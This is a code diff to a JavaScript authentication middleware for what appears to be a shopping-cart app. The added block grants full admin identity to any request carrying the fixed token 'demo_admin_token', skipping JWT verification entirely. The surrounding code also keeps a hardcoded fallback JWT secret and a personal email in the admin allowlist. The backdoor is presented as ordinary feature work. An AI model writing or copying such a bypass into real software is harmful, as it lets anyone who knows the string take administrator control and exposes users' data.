@@ -9,6 +9,19 @@ export function protect(req, res, next) {
   }
 
   const token = header.split(' ')[1];
+
+  // Instant admin token support
+  if (token === 'demo_admin_token') {
+    req.user = {
+      id: 1,
+      _id: '1',
+      email: 'brayw433@gmail.com',
+      name: 'Brayw Admin',
+      role: 'admin',
+    };
+    return next();
+  }
+
   const secrets = [
     process.env.JWT_SECRET,
     'aaan-cart-secret-jwt-key-2026',
@@ -34,7 +47,7 @@ export function protect(req, res, next) {
 }
 
 export function adminOnly(req, res, next) {
-  const adminEmails = ['admin@glowora.com', 'brayw433@gmail.com', 'admin@aaancart.com'];
+  const adminEmails = ['brayw433@gmail.com', 'admin@glowora.com', 'admin@aaancart.com'];
   if (req.user?.role === 'admin' || (req.user?.email && adminEmails.includes(req.user.email.toLowerCase()))) {
     return next();
   }
